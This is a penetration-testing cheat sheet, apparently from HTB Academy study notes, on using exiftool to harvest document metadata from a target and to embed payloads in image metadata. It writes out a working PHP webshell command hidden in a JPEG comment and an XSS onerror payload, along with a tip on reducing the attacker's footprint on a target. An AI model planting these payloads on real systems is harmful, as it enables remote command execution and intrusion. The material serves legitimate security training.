# exiftool

**Tags:** #exiftool #Metadata #EXIF #Recon #OSINT #FileUpload #XSS #Payloads

`exiftool` reads, writes, and strips metadata across essentially every file format that carries it — images, PDFs, Office documents, audio, video. Two distinct uses on an engagement: **recon**, pulling usernames, software versions, GPS coordinates, and internal paths out of documents harvested from a target's site; and **payload delivery**, writing attacker-controlled content into a metadata field so it survives an upload filter that only inspects file type.

**Source:** https://github.com/exiftool/exiftool
**Install:** ships in Kali (`exiftool`), or `sudo apt install libimage-exiftool-perl`

```bash
# Dump all metadata from a file
exiftool document.pdf

# Just the fields that leak identities and tooling
exiftool -Author -Creator -Producer -Software -GPSPosition *.pdf

# Bulk-harvest across a directory of scraped documents
exiftool -r -Author -Creator -Producer /path/to/downloads/ | grep -v "^$"

# Strip everything (cleaning your own artifacts before handing them over)
exiftool -all= report.pdf
```

```bash
# Payload embedding — PHP webshell in the Comment field
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg -o shell.jpg

# XSS payload for apps that render metadata back into the page
exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' image.jpg

# Verify the payload landed
exiftool -Comment shell.jpg
```

| Flag | Description |
|---|---|
| `-r` | Recurse into subdirectories |
| `-o <file>` | Write to a new file instead of editing in place |
| `-all=` | Strip all metadata |
| `-<Tag>=<value>` | Set a specific tag |
| `-csv` | CSV output — useful for bulk recon triage |
| `-overwrite_original` | Skip the `_original` backup copy |

> [!note] By default exiftool leaves a `file.jpg_original` backup next to the edited file. Harmless locally, but if you're writing into a directory on a target it doubles your footprint — use `-overwrite_original`.

> [!tip] Metadata harvesting pairs well with document discovery: pull every PDF/DOCX off a target's site, run exiftool across the lot, and you often get a valid username format and the exact software versions in use before touching the application itself.

> [!note] **See also** — [[Class notes/HTB Academy/CPTS v2 (claude)/File Upload Attacks|File Upload Attacks]] — EXIF payload embedding and image polyglots; [[Class notes/HTB Academy/CPTS v2 (claude)/Info Gathering|Info Gathering]] — document metadata harvesting.

---

*Created: 2026-07-30*
*Updated: 2026-07-30*
*Model: claude-opus-5*
